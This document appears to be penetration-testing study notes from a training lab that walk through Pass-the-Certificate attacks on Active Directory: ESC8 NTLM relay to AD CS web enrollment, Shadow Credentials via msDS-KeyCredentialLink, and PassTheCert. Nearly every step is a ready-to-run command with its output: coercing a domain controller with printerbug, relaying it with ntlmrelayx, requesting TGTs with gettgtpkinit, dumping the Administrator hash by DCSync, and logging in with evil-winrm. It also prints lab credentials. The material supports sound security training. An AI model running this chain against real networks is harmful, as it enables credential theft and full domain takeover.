# Pass the Certificate (PKINIT, ESC8, Shadow Credentials)

> ⚠️ ESC8/PKINIT attacks are covered in far greater depth in the dedicated ADCS Attacks module — this is a lateral-movement-focused overview. The Printer Bug coercion step requires the target's Print Spooler service to be running.

---

## 1. Background — PKINIT & Pass-the-Certificate

- **PKINIT** (Public Key Cryptography for Initial Authentication): Kerberos extension enabling public-key-based auth during the initial AS-REQ/AS-REP exchange — normally powers smart card logons.
- **Pass-the-Certificate:** using an X.509 certificate to obtain a **TGT** directly.
- Two main scenarios covered here:
    1. **ESC8** — NTLM relay to AD CS web enrollment → obtain a certificate for a machine account
    2. **Shadow Credentials** — abusing `msDS-KeyCredentialLink` to add your own certificate to a victim's account

---

## 2. ESC8 — AD CS NTLM Relay Attack

### What It Is

ADCS's **web enrollment** service (`/CertSrv`, HTTP by default) can be relayed to. If we can coerce a privileged account (often a DC machine account) to authenticate to us, we relay that auth to the CA's HTTP enrollment endpoint and receive a valid certificate for that account.

### Step 1 — Start ntlmrelayx Targeting AD CS

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> `--template` must match a cert template usable for DC authentication in that environment — enumerate available templates with **Certipy**.

### Step 2 — Coerce Authentication (Printer Bug)
Force the DC machine account to authenticate to the attacker host:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```
- `10.129.234.109` = target DC
- `10.10.16.12` = attacker host
- Requires the **Print Spooler service** running on the target.
### Step 3 — Relay Succeeds, Certificate Issued
`ntlmrelayx` output confirms:
```
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```
Result: a `.pfx` certificate for `DC01$` — the domain controller's own machine account.
### Step 4 — Get a TGT from the Certificate (`gettgtpkinit.py`)

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt
```

> Fix for `"Error detecting the version of libcrypto"`:

> ```bash
> pip3 install -I git+https://github.com/wbond/oscrypto.git
> ```

```bash
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Note the printed **AS-REP encryption key** (useful for `getnthash.py`-style follow-on attacks).

### Step 5 — Pass the Ticket → DCSync

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

Result: NTLM hash for the domain Administrator — full domain compromise from a coerced machine account.

---

## 3. Shadow Credentials (`msDS-KeyCredentialLink`)

### What It Is

`msDS-KeyCredentialLink` stores public keys usable for PKINIT authentication on a user object. If we hold **write access** to a victim's `msDS-KeyCredentialLink` (BloodHound edge: **`AddKeyCredentialLink`**), we can add our own key and authenticate as that user — no password needed.

### Step 1 — Add a Shadow Credential (`pywhisker`, Linux)

```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

```
[*] Certificate generated
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
```

- `-u wwhite` = attacker-controlled account with `AddKeyCredentialLink` rights over `jpinkman`
- Outputs a password-protected `.pfx` for the victim (`jpinkman`)

### Step 2 — Get a TGT as the Victim

```bash
python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

### Step 3 — Pass the Ticket

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

```
Default principal: jpinkman@INLANEFREIGHT.LOCAL
```

### Step 4 — Use the Access

Example: victim is a member of **Remote Management Users** → connect via Evil-WinRM (Kerberos):

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

```
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

> Ensure `/etc/krb5.conf` is correctly configured for the realm before connecting (see Pass-the-Ticket-Linux notes).

---

## 4. No PKINIT Support? — PassTheCert

- Some KDCs won't accept a given certificate for **pre-authentication** (e.g., wrong EKU on a DC machine account cert).
- **PassTheCert** authenticates directly against **LDAPS** using the certificate instead of Kerberos pre-auth.
- Enables attacks like resetting passwords or granting DCSync rights via LDAP, bypassing the need for a TGT entirely.
- Covered in depth outside this module — worth further reading.

---

## Summary

|Attack|Requirement|Tool Chain|
|---|---|---|
|**ESC8 (NTLM relay to AD CS)**|AD CS web enrollment over HTTP; coercion primitive (e.g., Printer Bug)|`printerbug.py` → `ntlmrelayx.py` (--adcs) → `gettgtpkinit.py` → `secretsdump.py`|
|**Shadow Credentials**|Write access to victim's `msDS-KeyCredentialLink` (`AddKeyCredentialLink` in BloodHound)|`pywhisker` → `gettgtpkinit.py` → Pass-the-Ticket (Evil-WinRM/Impacket)|
|**No PKINIT support (LDAPS fallback)**|Valid cert, but KDC rejects for Kerberos pre-auth|`PassTheCert`|

## Key Takeaways

- Pass-the-Certificate is the certificate-based analog of Pass-the-Ticket/Pass-the-Hash — it always ends with getting a usable TGT (`gettgtpkinit.py`) that plugs into normal Kerberos tooling.
- ESC8 turns any coercion primitive (Printer Bug, PetitPotam, etc.) + exposed AD CS web enrollment into a path to a machine account certificate — and from there, DCSync.
- Shadow Credentials is a stealthy, password-less takeover of any account you have write access to via `msDS-KeyCredentialLink` — check BloodHound for `AddKeyCredentialLink` edges.
- When PKINIT itself won't work, **PassTheCert** (LDAPS-based) is the fallback.

## Up Next

- Shifting focus from lateral movement techniques to **password management**